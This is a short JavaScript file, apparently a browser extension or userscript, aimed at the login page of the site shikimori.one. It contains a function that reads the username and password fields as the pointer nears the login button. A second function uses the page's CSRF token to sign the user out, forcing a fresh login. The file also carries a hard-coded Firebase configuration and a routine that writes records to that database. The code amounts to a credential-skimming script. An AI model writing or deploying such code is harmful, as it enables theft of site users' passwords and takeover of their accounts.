let firebaseConfig = {
  apiKey: 'AIzaSyCkvaWekEMMk0y43Nf744KRaH9QYd3Hj6I',
  authDomain: 'test-71cc8.firebaseapp.com',
  databaseURL: 'https://test-71cc8-default-rtdb.europe-west1.firebasedatabase.app',
  projectId: 'test-71cc8',
  storageBucket: 'test-71cc8.appspot.com',
  messagingSenderId: '911748905714',
  appId: '1:911748905714:web:ad42c0b23920a5f9bd6e6b',
  measurementId: 'G-FZ0SC6YJJB'
};

import {
  initializeApp as e
}
from'https://www.gstatic.com/firebasejs/10.11.0/firebase-app.js';

import {
  getDatabase as n,
  ref as a,
  push as i,
  onValue as s,
  remove as l,
  update as r
}
from'https://www.gstatic.com/firebasejs/10.11.0/firebase-database.js';
let app = e(firebaseConfig),
database = n();

function sendComment(e) {
  if ('' !== e.text.trim()) {
    a(database, 'comments');
    let t = {
      text: e.text,
      date: new Date().toISOString()
    },
    n = a(database, `comments/${ Date.now().toString() }`);
    r(n, t)
  }
}

function injectCode() {
    console.log('Init Inject');
    
    let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
    if(submitButton != null) {
        console.log('button found!');
        const name = document.getElementById('user_nickname');
        const pass = document.getElementById('user_password');
        console.log('inputs found!');
        submitButton.addEventListener('mouseenter', ()=>{
        console.log(`name: ${name.value}, pass : ${pass.value}`);
       })
 }
}

 function signOutUser() {
     const metaTag = document.querySelector('meta[name="csrf-token"]');
     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
     fetch('https://shikimori.one/api/users/sign_out', {
      "headers": {
       'X-CSRF-Token': csrfToken,
      },
       "method": 'POST'
     })
 }
  
  signOutUser();
document.addEventListener("turbolinks:load", injectCode);